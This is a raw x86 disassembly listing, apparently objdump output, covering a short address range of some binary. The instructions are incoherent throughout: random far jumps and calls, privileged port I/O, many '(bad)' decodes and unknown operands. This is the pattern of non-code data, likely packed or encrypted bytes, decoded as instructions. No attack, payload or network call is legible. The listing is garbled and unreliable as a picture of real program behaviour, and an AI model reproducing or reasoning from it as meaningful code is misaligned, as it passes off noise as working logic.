  41d7ae:	int    0xaf
  41d7b0:	fidiv  DWORD PTR [esi]
  41d7b2:	loop   0x41d775
  41d7b4:	aaa    
  41d7b5:	jnp    0x41d752
  41d7b7:	mov    bh,0xd0
  41d7b9:	mov    BYTE PTR [edi],cl
  41d7bb:	inc    edx
  41d7bc:	gs addr16 add cl,ch
  41d7c0:	cli    
  41d7c1:	xchg   esp,eax
  41d7c2:	arpl   WORD PTR [edx],sp
  41d7c4:	stos   DWORD PTR es:[edi],eax
  41d7c5:	in     eax,dx
  41d7c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7c7:	sbb    ebx,esi
  41d7c9:	pop    edx
  41d7ca:	or     dh,ah
  41d7cc:	add    BYTE PTR [ebx-0x80],bl
  41d7cf:	ret    
  41d7d0:	outs   dx,DWORD PTR ds:[esi]
  41d7d1:	push   eax
  41d7d2:	dec    edi
  41d7d3:	test   BYTE PTR [esi+0x240dba1d],bh
  41d7d9:	jb     0x41d796
  41d7db:	xchg   ebp,eax
  41d7dc:	dec    edi
  41d7dd:	mov    ah,0x45
  41d7df:	dec    esp
  41d7e0:	inc    ebx
  41d7e1:	stos   DWORD PTR es:[edi],eax
  41d7e2:	inc    ebp
  41d7e3:	int3   
  41d7e4:	jge    0x41d7bb
  41d7e6:	mov    dl,0xa0
  41d7e8:	jecxz  0x41d77c
  41d7ea:	jae    0x41d81b
  41d7ec:	cmc    
  41d7ed:	mov    bh,0xec
  41d7ef:	mov    esi,eax
  41d7f1:	jg     0x41d7c8
  41d7f3:	jne    0x41d79c
  41d7f5:	sub    esp,DWORD PTR [ebp+0x1d]
  41d7f8:	xchg   ecx,eax
  41d7f9:	test   eax,0x8027254a
  41d7fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7ff:	jmp    0x4cca:0xdb8a4e50
  41d806:	pop    es
  41d807:	and    DWORD PTR [ebx+0x72],0xffffffc1
  41d80b:	in     eax,0xec
  41d80d:	jae    0x41d81c
  41d80f:	xchg   esp,eax
  41d810:	xor    esi,DWORD PTR ds:0xe5c1813d
  41d816:	arpl   WORD PTR [ecx],sp
  41d818:	jp     0x41d7a7
  41d81a:	sub    esp,DWORD PTR [edx]
  41d81c:	jns    0x41d7a6
  41d81e:	cli    
  41d81f:	std    
  41d820:	adc    DWORD PTR ds:0x13fac380,edx
  41d826:	dec    esp
  41d827:	xchg   esi,eax
  41d828:	cmp    edi,DWORD PTR [eax+edx*4-0xb137c6c]
  41d82f:	test   al,0x6
  41d831:	mov    BYTE PTR [ebp+0x43],ah
  41d834:	out    dx,al
  41d835:	push   ebx
  41d836:	cmc    
  41d837:	lods   al,BYTE PTR ds:[esi]
  41d838:	je     0x41d8a4
  41d83a:	xor    BYTE PTR [ecx-0x70b3ab5d],ah
  41d840:	shl    BYTE PTR [edi+0x2c9b32bf],cl
  41d846:	xchg   BYTE PTR ds:[esi+0x7b0d79f7],dh
  41d84d:	mov    ebx,0xcd3e679c
  41d852:	xchg   esp,eax
  41d853:	dec    eax
  41d854:	ins    BYTE PTR es:[edi],dx
  41d855:	push   edx
  41d856:	cwde   
  41d857:	mov    al,ds:0xb3650028
  41d85c:	sar    BYTE PTR [edx],0x52
  41d85f:	aaa    
  41d860:	mov    ah,BYTE PTR [esi]
  41d862:	pop    edi
  41d863:	sbb    eax,esi
  41d865:	inc    edx
  41d866:	push   eax
  41d867:	cli    
  41d868:	add    eax,0x66367660
  41d86d:	push   ecx
  41d86e:	mov    DWORD PTR [eax+0x5d],ebx
  41d871:	inc    edi
  41d872:	sub    al,0xe
  41d874:	mov    dl,0x73
  41d876:	mov    ah,0xaf
  41d878:	mov    edi,0xf11a61bb
  41d87d:	xchg   DWORD PTR [esi+0x39],edx
  41d880:	or     al,BYTE PTR [eax-0x19dcebe7]
  41d886:	arpl   di,si
  41d888:	push   0x1b
  41d88a:	cld    
  41d88b:	mov    WORD PTR [edx],es
  41d88d:	sub    al,0xb9
  41d88f:	cli    
  41d890:	pop    ecx
  41d891:	aad    0xb3
  41d893:	inc    ecx
  41d894:	iret   
  41d895:	adc    BYTE PTR [ebx],0x5c
  41d898:	xchg   ecx,eax
  41d899:	ficomp DWORD PTR [eax-0x6fc12839]
  41d89f:	xor    ecx,ebx
  41d8a1:	lods   al,BYTE PTR ds:[esi]
  41d8a2:	and    cl,bl
  41d8a4:	repnz or bh,BYTE PTR ds:0xb8d317af
  41d8ab:	sbb    BYTE PTR [edi],0x69
  41d8ae:	mov    dh,0x44
  41d8b0:	jg     0x41d837
  41d8b2:	into   
  41d8b3:	jle    0x41d85f
  41d8b5:	loopne 0x41d92d
  41d8b7:	call   FWORD PTR ds:0xe8d66e6e
  41d8bd:	sbb    al,0x89
  41d8bf:	sti    
  41d8c0:	fisttp DWORD PTR ds:0x222d6670
  41d8c6:	push   0xffffffc0
  41d8c8:	jnp    0x41d948
  41d8ca:	push   esi
  41d8cb:	xchg   BYTE PTR [ebp+0x2bf57eb5],dh
  41d8d1:	mov    ds:0x5edce568,eax
  41d8d6:	sbb    eax,0xa1db996e
  41d8db:	sbb    al,0xf9
  41d8dd:	push   eax
  41d8de:	or     DWORD PTR [esp+esi*4+0x60cd55be],edx
  41d8e5:	sbb    al,BYTE PTR gs:[eax+0x1d7a034e]
  41d8ec:	cld    
  41d8ed:	test   DWORD PTR [ebx+0x17],esi
  41d8f0:	jecxz  0x41d92f
  41d8f2:	mov    bh,0x3f
  41d8f4:	add    eax,0xd5ab674d
  41d8f9:	repnz or al,0x3d
  41d8fc:	int3   
  41d8fd:	or     eax,0x77a9ab57
  41d902:	ds add al,0xb8
  41d905:	xchg   ebx,eax
  41d906:	mov    es,WORD PTR [edx]
  41d908:	adc    bh,0xe1
  41d90b:	or     DWORD PTR [ebp+0x310abb7a],edx
  41d911:	jb     0x41d8af
  41d913:	ficomp DWORD PTR [edi]
  41d915:	imul   ecx,DWORD PTR [ebx+0x35],0x31
  41d919:	pop    eax
  41d91a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d91b:	push   eax
  41d91c:	mov    BYTE PTR [edx+0x1c5f8fc8],bl
  41d922:	stos   BYTE PTR es:[edi],al
  41d923:	popf   
  41d924:	(bad)  
  41d925:	and    DWORD PTR [ebp-0x8],esp
  41d928:	loope  0x41d8eb
  41d92a:	les    edi,FWORD PTR [eax+0x7b]
  41d92d:	imul   ebp,DWORD PTR [ebx+0x54777204],0xc3b9907f
  41d937:	sub    eax,DWORD PTR [eax+0x1ac02ea3]
  41d93d:	mul    BYTE PTR ds:0x927e5db7
  41d943:	mov    dl,0xe9
  41d945:	leave  
  41d946:	add    esi,DWORD PTR [edi*2+0x71c516d9]
  41d94d:	mov    ah,0x5f
  41d94f:	jbe    0x41d903
  41d951:	xchg   ebx,eax
  41d952:	and    BYTE PTR [eax],ch
  41d954:	or     ch,bl
  41d956:	inc    edi
  41d957:	call   0xfb84:0xb26c95fc
  41d95e:	xor    al,0x41
  41d960:	ja     0x41d9a3
  41d962:	mov    esi,0xb22c0b8d
  41d967:	les    ebp,FWORD PTR [ecx+0x3a]
  41d96a:	retf   
  41d96b:	or     ah,BYTE PTR [ecx-0x3b22946]
  41d971:	mov    WORD PTR [eax+0xe],?
  41d974:	dec    edx
  41d975:	ret    
  41d976:	mov    ah,ch
  41d978:	fdiv   QWORD PTR [eax-0x23008a83]
  41d97e:	xchg   edi,eax
  41d97f:	(bad)  
  41d980:	xchg   BYTE PTR ds:0xa8bdeba0,ch
  41d986:	or     DWORD PTR [edi],eax
  41d988:	fisubr WORD PTR [ebx+0x15]
  41d98b:	dec    ebp
  41d98c:	lea    esi,[ecx]
  41d98e:	fsub   QWORD PTR [ebp+eiz*2+0x46]
  41d992:	out    0xbd,eax
  41d994:	and    eax,0x34d151a1
  41d999:	scas   al,BYTE PTR es:[edi]
  41d99a:	xlat   BYTE PTR ds:[ebx]
  41d99b:	add    BYTE PTR [ebx+0x714b27a9],bh
  41d9a1:	push   ds
  41d9a2:	xchg   esi,eax
  41d9a3:	std    
  41d9a4:	sbb    al,0xaf
  41d9a6:	and    esp,edi
  41d9a8:	mov    ecx,0x29e6655e
  41d9ad:	xchg   esp,eax
  41d9ae:	mov    ah,BYTE PTR [eax-0x4b494977]
  41d9b4:	jmp    FWORD PTR [ecx+edx*2+0x3d]
  41d9b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9b9:	cwde   
  41d9ba:	gs cmp eax,0xfa610ee8
  41d9c0:	inc    ecx
  41d9c1:	ins    BYTE PTR es:[edi],dx
  41d9c2:	fs inc esp
  41d9c4:	js     0x41d976
  41d9c6:	dec    ebx
  41d9c7:	inc    ebx
  41d9c8:	dec    edi
  41d9c9:	cwde   
  41d9ca:	mov    ebx,0x81db80b5
  41d9cf:	stos   DWORD PTR es:[edi],eax
  41d9d0:	loop   0x41da1e
  41d9d2:	repnz inc esi
  41d9d4:	xor    eax,0xe2e2eb6e
  41d9d9:	adc    cl,al
  41d9db:	push   ecx
  41d9dc:	scas   al,BYTE PTR es:[edi]
  41d9dd:	push   0xc
  41d9df:	pop    es
  41d9e0:	loop   0x41d9e2
  41d9e2:	cmp    BYTE PTR [eax],0x95
  41d9e5:	ds dec esp
  41d9e7:	mov    BYTE PTR [ecx],dh
  41d9e9:	or     ecx,ecx
  41d9eb:	shl    DWORD PTR [ebx],0x80
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jne    0x41d9bf
  41d9f1:	jmp    0xc3479873
  41d9f6:	ret    0xb4bc
  41d9f9:	inc    edi
  41d9fa:	je     0x41d9d4
  41d9fc:	mov    ds:0x31eb6584,al
  41da01:	add    ah,ch
  41da03:	xchg   esp,eax
  41da04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da05:	std    
  41da06:	in     al,0xd9
  41da08:	rcl    DWORD PTR [ebp-0x1d],1
  41da0b:	xor    ch,BYTE PTR [edi]
  41da0d:	and    eax,0x35aa3cfc
  41da12:	jne    0x41da6b
  41da14:	cli    
  41da15:	call   0x650ce335
  41da1a:	mov    bl,0x7d
  41da1c:	fcomp  st(0)
  41da1e:	sbb    BYTE PTR [ecx],ch
  41da20:	test   BYTE PTR [edx],0x8e
  41da23:	adc    DWORD PTR [ebx+0x7e29f5bd],0x61
  41da2a:	nop
  41da2b:	or     BYTE PTR ds:0xbead05e1,ah
  41da31:	mov    cl,0x8
  41da33:	add    dl,BYTE PTR [esi+0x7a]
  41da36:	jmp    0x41d9e5
  41da38:	push   es
  41da39:	jg     0x41da54
  41da3b:	in     eax,0x4d
  41da3d:	dec    edi
  41da3e:	inc    edx
  41da3f:	sysenter 
  41da41:	(bad)  
  41da42:	pop    edx
  41da43:	cs jecxz 0x41dac5
  41da46:	daa    
  41da47:	dec    ebx
  41da48:	push   0xffffff8b
  41da4a:	daa    
  41da4b:	inc    esp
  41da4c:	mov    al,0xa2
  41da4e:	jmp    0x5a569fa9
  41da53:	pop    esi
  41da54:	gs (bad) 
  41da56:	int    0x6a
  41da58:	push   0xffffffaf
  41da5a:	cmp    BYTE PTR [edi],bh
  41da5c:	mov    edi,0x82c46eb3
  41da61:	push   es
  41da62:	test   eax,0xf4cf92a2
  41da67:	fnstcw WORD PTR [ecx]
  41da69:	outs   dx,BYTE PTR ds:[esi]
  41da6a:	mov    ecx,0x1c3dfcb0
  41da6f:	dec    ebp
  41da70:	push   edx
  41da71:	cli    
  41da72:	adc    ah,BYTE PTR [ebx*2-0x29d88784]
  41da79:	call   0x29ee:0xb2108bb1
  41da80:	stos   BYTE PTR es:[edi],al
  41da81:	and    eax,0x65043b04
  41da86:	loopne 0x41da59
  41da88:	pop    esi
  41da89:	inc    edi
  41da8a:	aas    
  41da8b:	js     0x41da75
  41da8d:	and    eax,0x97948bb0
  41da92:	mov    esi,0xdcaac442
  41da97:	add    dl,BYTE PTR ds:0xb880c1b6
  41da9d:	sub    DWORD PTR [eax+0x3a466298],0x6673e36f
  41daa7:	test   dl,bh
  41daa9:	inc    eax
  41daaa:	les    eax,FWORD PTR [edx-0x75dbbaa1]
  41dab0:	cmp    cl,al
  41dab2:	xchg   BYTE PTR [ecx],bl
  41dab4:	sbb    BYTE PTR [edi+ebp*4],al
  41dab7:	mov    edx,0x51d3358f
  41dabc:	lahf   
  41dabd:	in     eax,dx
  41dabe:	(bad)  
  41dabf:	mov    esi,DWORD PTR [ebx]
  41dac1:	adc    ah,BYTE PTR [edx]
  41dac3:	mov    ss,WORD PTR [ebx-0xa]
  41dac6:	add    BYTE PTR [ecx-0x80],al
  41dac9:	xor    DWORD PTR [ebp-0x75],0x531a1f2d
  41dad0:	leave  
  41dad1:	aas    
  41dad2:	mov    ecx,0x31bda885
  41dad7:	dec    BYTE PTR [ebx+esi*4-0x46]
  41dadb:	xor    BYTE PTR [ebx],cl
  41dadd:	sub    eax,0xe61694e8
  41dae2:	jge    0x41dad6
  41dae4:	ins    BYTE PTR es:[edi],dx
  41dae5:	mov    dh,0x18
  41dae7:	xor    al,0x8
  41dae9:	add    DWORD PTR [ecx-0x7c34c448],ebx
  41daef:	out    0x90,al
  41daf1:	and    eax,DWORD PTR [ebp-0x20]
  41daf4:	mov    eax,?
  41daf6:	cmc    
  41daf7:	mov    cl,0xeb
  41daf9:	sub    esp,DWORD PTR [edi-0x2f]
  41dafc:	adc    eax,0xc2e25640
  41db01:	add    al,0x4f
  41db03:	pop    esp
  41db04:	jge    0x41da96
  41db06:	sub    bl,BYTE PTR [ebx]
  41db08:	(bad)  
  41db09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db0a:	out    0x38,eax
  41db0c:	cmp    dl,BYTE PTR [edx+0x2]
  41db0f:	xchg   ecx,eax
  41db10:	jae    0x41daf2
  41db12:	pop    edi
  41db13:	xor    BYTE PTR [ecx],cl
  41db15:	mov    ebp,0x208acbdb
  41db1a:	mov    fs,WORD PTR [edi-0x3e]
  41db1d:	mov    ah,0xf2
  41db1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db20:	mov    bh,0x5a
  41db22:	sbb    eax,0x7f8e726e
  41db27:	jmp    0x56bd:0xf2a133b2
  41db2e:	inc    ecx
  41db2f:	cmp    BYTE PTR [edi-0x1ccbda5],cl
  41db35:	into   
  41db36:	sub    eax,0xeec5bcd9
  41db3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db3c:	imul   ecx,edx,0x2942701a
  41db42:	pop    edx
  41db43:	push   esi
  41db44:	jl     0x41db3a
  41db46:	inc    eax
  41db47:	push   eax
  41db48:	int    0x45
  41db4a:	out    dx,al
  41db4b:	fisubr DWORD PTR [eax-0x3b94bf61]
  41db51:	jns    0x41db40
  41db53:	fnstcw WORD PTR [ebx+0x9]
  41db56:	mov    bl,0xd
  41db58:	mov    al,ds:0x1d554eee
  41db5d:	mov    ecx,0x91bf8b61
  41db62:	or     al,BYTE PTR es:[esi]
  41db65:	ja     0x41db0b
  41db67:	mov    edi,esi
  41db69:	jg     0x41db30
  41db6b:	or     eax,0x32a4c41a
  41db70:	jl     0x41dbb8
  41db72:	sbb    DWORD PTR [ecx],esp
  41db74:	pop    es
  41db75:	pop    ss
  41db76:	push   edi
  41db77:	jecxz  0x41dbbf
  41db79:	push   ecx
  41db7a:	xlat   BYTE PTR ds:[ebx]
  41db7b:	or     BYTE PTR [ecx+0xc135a0a],0x6d
  41db82:	add    al,BYTE PTR [ebx-0x7a42a5a8]
  41db88:	aad    0xf5
  41db8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db8b:	jmp    0xd80f:0xfa3b64e9
  41db92:	outs   dx,DWORD PTR ds:[esi]
  41db93:	in     eax,0xbb
  41db95:	ins    DWORD PTR es:[edi],dx
  41db96:	mov    bl,0x61
  41db98:	(bad)  [eax+0x10]
  41db9b:	loop   0x41db93
  41db9d:	add    BYTE PTR [edx+0x64],ch
  41dba0:	pop    esi
  41dba1:	xor    DWORD PTR [eax],edi
  41dba3:	lahf   
  41dba4:	test   DWORD PTR [ecx-0x5c],edi
  41dba7:	nop
  41dba8:	jae    0x41db2c
  41dbaa:	stos   BYTE PTR es:[edi],al
  41dbab:	iret   
  41dbac:	xor    edi,DWORD PTR [edx+esi*1+0x3d9c69d5]
  41dbb3:	add    BYTE PTR [eax],bl
  41dbb5:	inc    eax
  41dbb6:	(bad)  
  41dbb8:	retf   0x8223
  41dbbb:	dec    edx
  41dbbc:	jns    0x41dc39
  41dbbe:	mov    ch,0x7c
  41dbc0:	js     0x41dbb3
  41dbc2:	das    
  41dbc3:	jp     0x41dbd8
  41dbc5:	or     eax,0xa2e9692e
  41dbca:	enter  0x12c9,0xa2
  41dbce:	push   edx
  41dbcf:	mov    edi,0x2913b502
  41dbd4:	dec    esp
  41dbd5:	cmc    
  41dbd6:	xchg   esp,eax
  41dbd7:	mov    bl,0x67
  41dbd9:	adc    cl,BYTE PTR [ebp-0x500d6758]
  41dbdf:	and    ecx,esp
  41dbe1:	scas   eax,DWORD PTR es:[edi]
  41dbe2:	cmp    BYTE PTR [ebx-0x76854b0a],ch
  41dbe8:	sbb    eax,0x3b6a9748
  41dbed:	inc    esi
  41dbee:	fstp   TBYTE PTR [edi+0x6c806b70]
  41dbf4:	loopne 0x41dbf3
  41dbf6:	adc    al,0xdd
  41dbf8:	fwait
  41dbf9:	(bad)  
  41dbfa:	mov    ebp,0xe78ba535
  41dbff:	mov    edx,0xd8ae7c83
  41dc04:	sbb    al,BYTE PTR [edx-0x9]
  41dc07:	xchg   BYTE PTR [eax+eax*2-0xa],ch
  41dc0b:	adc    eax,0xbc718554
  41dc10:	jg     0x41dbaa
  41dc12:	aam    0xcb
  41dc14:	aaa    
  41dc15:	mov    ch,0x4
  41dc17:	xlat   BYTE PTR ds:[ebx]
  41dc18:	(bad)  
  41dc19:	jle    0x41dc7c
  41dc1b:	leave  
  41dc1c:	ins    DWORD PTR es:[edi],dx
  41dc1d:	idiv   DWORD PTR ds:0xd7e30442
  41dc23:	ficom  WORD PTR es:[ebx+ebx*2-0x1d3e18b3]
  41dc2b:	sub    edi,DWORD PTR [ebx+ecx*2-0x4886224a]
  41dc32:	sbb    eax,0xc34a9b13
  41dc37:	adc    BYTE PTR [eax-0x1d602221],bh
  41dc3d:	xlat   BYTE PTR ds:[ebx]
  41dc3e:	mov    esp,DWORD PTR [ecx]
  41dc40:	push   ds
  41dc41:	cmp    BYTE PTR [ecx+0x1c],bl
  41dc44:	inc    ebx
  41dc45:	dec    esp
  41dc46:	jae    0x41dcc7
  41dc48:	cmc    
  41dc49:	das    
  41dc4a:	jne    0x41dca4
  41dc4c:	pusha  
  41dc4d:	dec    edx
  41dc4e:	sub    ebx,ecx
  41dc50:	push   ebx
  41dc51:	fisub  DWORD PTR [ecx+edx*2+0x3e6ba817]
  41dc58:	jl     0x41dcb0
  41dc5a:	adc    al,0x3d
  41dc5c:	inc    ecx
  41dc5d:	jp     0x41dc80
  41dc5f:	xchg   ebp,eax
  41dc60:	mov    ch,0xf5
  41dc62:	jmp    0x72c2e426
  41dc67:	pop    esi
  41dc68:	pop    es
  41dc69:	mov    ah,0x82
  41dc6c:	loope  0x41dbef
  41dc6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc6f:	ins    BYTE PTR es:[edi],dx
  41dc70:	aaa    
  41dc71:	retf   0x1d87
  41dc74:	les    eax,FWORD PTR ds:[esi-0x58087fc9]
  41dc7b:	in     eax,dx
  41dc7c:	aad    0x9c
  41dc7e:	shr    DWORD PTR [esi+edi*8+0xfa6d4b9],cl
  41dc85:	je     0x41dcb6
  41dc87:	sbb    BYTE PTR [eax],bl
  41dc89:	xor    ah,bl
  41dc8b:	sub    al,0xb4
  41dc8d:	bswap  ebx
  41dc8f:	jge    0x41dc77
  41dc91:	retf   
  41dc92:	xlat   BYTE PTR ds:[ebx]
  41dc93:	fdivr  DWORD PTR [edi+esi*1]
  41dc96:	outs   dx,DWORD PTR ds:[esi]
  41dc97:	xchg   edx,eax
  41dc98:	sbb    eax,0xb0897f68
  41dc9d:	xor    BYTE PTR [esp+ecx*8],0xc0
  41dca1:	mov    ch,0xca
  41dca3:	je     0x41dd22
  41dca5:	xchg   esi,eax
  41dca6:	das    
  41dca7:	dec    esi
  41dca8:	scas   al,BYTE PTR es:[edi]
  41dca9:	stc    
  41dcaa:	and    eax,0x9b9108f
  41dcaf:	and    ebx,edi
  41dcb1:	pop    edx
  41dcb2:	in     eax,dx
  41dcb3:	test   al,0x77
  41dcb5:	mov    ebx,0xa70d9949
  41dcba:	or     edi,eax
  41dcbc:	inc    eax
  41dcbd:	mov    DWORD PTR [edx-0x2bb2724c],esp
  41dcc3:	imul   ebp,DWORD PTR [esi],0x73
  41dcc6:	dec    edi
  41dcc7:	call   0x6ad1:0x7a8596cf
  41dcce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dccf:	icebp  
  41dcd0:	and    DWORD PTR [eax],esi
  41dcd2:	out    dx,eax
  41dcd3:	pop    edx
  41dcd4:	push   cs
  41dcd5:	push   eax
  41dcd6:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41dcd8:	mov    eax,0x4abd300a
  41dcdd:	adc    ebp,DWORD PTR [edx+0x22]
  41dce0:	push   edx
  41dce1:	mov    fs,WORD PTR ds:0x746059c3
  41dce7:	adc    BYTE PTR [ecx+0x6b],ch
  41dcea:	inc    ebp
  41dceb:	imul   esi,DWORD PTR [edi+0x76],0x5e905421
  41dcf2:	xlat   BYTE PTR ds:[ebx]
  41dcf3:	aam    0xeb
  41dcf5:	retf   0x794
  41dcf8:	aas    
  41dcf9:	int    0x10
  41dcfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcfc:	push   ebp
  41dcfd:	push   ss
  41dcfe:	test   eax,0xb391074b
  41dd03:	cdq    
  41dd04:	mov    esp,0x1f9d7c0c
  41dd09:	add    eax,0x14cf9572
  41dd0e:	retf   
  41dd0f:	sbb    eax,0xe6c786bb
  41dd14:	retf   0x3b8b
  41dd17:	cs xor al,0x75
  41dd1a:	leave  
  41dd1b:	call   FWORD PTR [eax]
  41dd1d:	ins    DWORD PTR es:[edi],dx
  41dd1e:	pop    edi
  41dd1f:	outs   dx,DWORD PTR ds:[esi]
  41dd20:	pop    ds
  41dd21:	or     ebp,DWORD PTR [edx]
  41dd23:	sbb    dl,BYTE PTR [eax]
  41dd25:	push   cs
  41dd26:	jae    0x41dcb0
  41dd28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd29:	pusha  
  41dd2a:	jno    0x41dcc0
  41dd2c:	push   ebx
  41dd2d:	pop    es
  41dd2e:	sti    
  41dd2f:	out    0xc4,eax
  41dd31:	mov    al,0xa
  41dd33:	xchg   edx,eax
  41dd34:	xchg   ebp,eax
  41dd35:	cdq    
  41dd36:	lods   al,BYTE PTR ds:[esi]
  41dd37:	add    DWORD PTR [edx-0x67],edi
  41dd3a:	(bad)  
  41dd3c:	cld    
  41dd3d:	push   ebx
  41dd3e:	xor    ah,BYTE PTR [ebx+0x60]
  41dd41:	mov    al,ds:0x3b2be810
  41dd46:	ret    0x3b63
  41dd49:	pusha  
  41dd4a:	lock jbe 0x41dcec
  41dd4d:	popa   
  41dd4e:	in     al,0x76
  41dd50:	fsubr  DWORD PTR [ecx+0x61]
  41dd53:	cs scas eax,DWORD PTR es:[edi]
  41dd55:	outs   dx,DWORD PTR ds:[esi]
  41dd56:	xchg   edi,eax
  41dd57:	sti    
  41dd58:	jmp    0xd2315582
  41dd5d:	outs   dx,DWORD PTR ds:[esi]
  41dd5e:	and    bl,bl
  41dd60:	mov    BYTE PTR [ebx],ah
  41dd62:	jecxz  0x41dd32
  41dd64:	inc    ebx
  41dd65:	sbb    al,0x18
  41dd67:	push   edx
  41dd68:	call   DWORD PTR [esi-0x6f7e7605]
  41dd6e:	xor    ebp,DWORD PTR [ecx-0x4ee73b5c]
  41dd74:	repnz cld 
  41dd76:	jmp    0xab98df10
  41dd7b:	mov    edx,0xa8353296
  41dd80:	sbb    BYTE PTR [esi],ch
  41dd82:	in     al,dx
  41dd83:	in     eax,dx
  41dd84:	and    al,0x25
  41dd86:	mov    al,ds:0xf27524fd
  41dd8b:	outs   dx,DWORD PTR ds:[esi]
  41dd8c:	shr    BYTE PTR [eax+0x230173f],cl
  41dd92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd93:	mov    dh,0xf2
  41dd95:	xchg   ebp,eax
  41dd96:	or     ebx,esp
  41dd98:	dec    edx
  41dd99:	pop    ds
  41dd9a:	mov    ds:0x972ffb98,eax
  41dd9f:	or     al,0xdd
  41dda1:	aas    
  41dda2:	es stos BYTE PTR es:[edi],al
  41dda4:	jmp    0x1f93:0xc768f6f0
  41ddab:	lods   al,BYTE PTR ds:[esi]
  41ddac:	jne    0x41ddc2
  41ddae:	mov    dl,dl
  41ddb0:	cmp    al,0x70
  41ddb2:	mov    eax,0x24a5312c
  41ddb7:	bound  ebp,QWORD PTR [eax-0x4a]
  41ddba:	aaa    
  41ddbb:	and    BYTE PTR [esi+eax*1],dh
  41ddbe:	hlt    
  41ddbf:	jmp    0x402189e0
  41ddc4:	jnp    0x41ddfc
  41ddc6:	jmp    0x41dd6f
  41ddc8:	sbb    ebx,DWORD PTR [ebx-0x46]
  41ddcb:	mov    ah,0x8
  41ddcd:	call   0xda1eae90
  41ddd2:	xchg   dl,dl
  41ddd4:	push   ds
  41ddd5:	cmc    
  41ddd6:	adc    esp,DWORD PTR [edi+0x22]
  41ddd9:	jns    0x41de3a
  41dddb:	neg    eax
  41dddd:	or     bl,BYTE PTR [esi]
  41dddf:	fwait
  41dde0:	in     eax,dx
  41dde1:	data16 sahf 
  41dde3:	inc    eax
  41dde4:	xor    esp,ecx
  41dde6:	pop    ebx
  41dde7:	pop    eax
  41dde8:	xlat   BYTE PTR ds:[ebx]
  41dde9:	leave  
  41ddea:	pop    ds
  41ddeb:	jne    0x41ddde
  41dded:	mov    ebp,0x14fb179d
  41ddf2:	jge    0x41ddc5
  41ddf4:	sbb    cl,BYTE PTR [edi-0x31]
  41ddf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddf8:	out    0xe8,eax
  41ddfa:	add    ah,BYTE PTR [ebp-0x69]
  41ddfd:	sub    DWORD PTR [eax],ebp
  41ddff:	cmp    esi,DWORD PTR [edx+ebp*4+0x1aebf48f]
  41de06:	cmp    ch,BYTE PTR [ebx]
  41de08:	adc    BYTE PTR [esi-0x609bdafc],al
  41de0e:	call   ecx
  41de10:	add    DWORD PTR [edx],ebx
  41de12:	mov    ch,0xa
  41de14:	dec    edx
  41de15:	out    0x57,al
  41de17:	scas   al,BYTE PTR es:[edi]
  41de18:	or     esp,DWORD PTR [edx+edx*4-0x20]
  41de1c:	(bad)  
  41de1d:	dec    edx
  41de1e:	data16 mov ah,0x3e
  41de21:	leave  
  41de22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de23:	lahf   
  41de24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de25:	(bad)  
  41de27:	(bad)  
  41de28:	sub    dl,dh
  41de2a:	cmp    cl,0x95
  41de2d:	fs arpl di,sp
  41de30:	daa    
  41de31:	es and eax,0xb8dfe5bd
  41de37:	sub    ch,al
  41de39:	std    
  41de3a:	xchg   esp,eax
  41de3b:	lods   al,BYTE PTR ds:[esi]
  41de3c:	call   0x8c0475eb
  41de41:	(bad)  
  41de42:	loopne 0x41de4c
  41de44:	dec    edi
  41de45:	lock fld QWORD PTR [ebp-0x62]
  41de49:	pop    esi
  41de4a:	(bad)  
  41de4b:	int3   
  41de4c:	in     al,0x8c
  41de4e:	pop    esi
  41de4f:	fld    QWORD PTR [esp+ebx*8+0x15]
  41de53:	push   es
  41de54:	or     BYTE PTR [esi],ch
  41de56:	daa    
  41de57:	dec    edx
  41de58:	jmp    0x41ded2
  41de5a:	and    ecx,DWORD PTR [edi]
  41de5c:	mov    dl,0x74
  41de5e:	xchg   BYTE PTR [edi-0x60],ah
  41de61:	mov    DWORD PTR [ebx+0x20],0xf87c3cdf
  41de68:	mov    ?,WORD PTR [ebx-0x46b03229]
  41de6e:	pop    ecx
  41de6f:	ret    
  41de70:	je     0x41de1a
  41de72:	and    eax,0xa27fb17a
  41de77:	add    edi,esp
  41de79:	xor    bh,ch
  41de7b:	inc    ebp
  41de7c:	cli    
  41de7d:	fwait
  41de7e:	jge    0x41decb
  41de80:	inc    ecx
  41de81:	int3   
  41de82:	sti    
  41de83:	cmp    BYTE PTR [eax-0x13],bl
  41de86:	das    
  41de87:	jmp    0x8a55b8d3
  41de8c:	adc    eax,0xc68d003c
  41de91:	sbb    DWORD PTR [esi],esi
  41de93:	adc    BYTE PTR [edx+0x42581991],bl
  41de99:	(bad)  
  41de9a:	ins    BYTE PTR es:[edi],dx
  41de9b:	rcr    BYTE PTR [eax+0x23],1
  41de9e:	or     cl,al
  41dea0:	cmp    ebx,DWORD PTR [eax]
  41dea2:	test   eax,0x599c117d
  41dea7:	mov    esi,0x484d4a73
  41deac:	or     eax,0x398c3bb3
  41deb1:	or     eax,0x17da4ae7
  41deb7:	(bad)  
  41deb9:	xlat   BYTE PTR ds:[ebx]
  41deba:	mov    edi,0x3c9781dd
  41debf:	sbb    edi,DWORD PTR [ebp-0x1a]
  41dec2:	mov    eax,ds:0x8995cc63
  41dec7:	call   0x739b:0x99d580e8
  41dece:	lock pop edi
  41ded0:	dec    esp
  41ded1:	jl     0x41df45
  41ded3:	mov    WORD PTR [edi+0x1cfdf2f8],ss
  41ded9:	xor    eax,0x12ac72ce
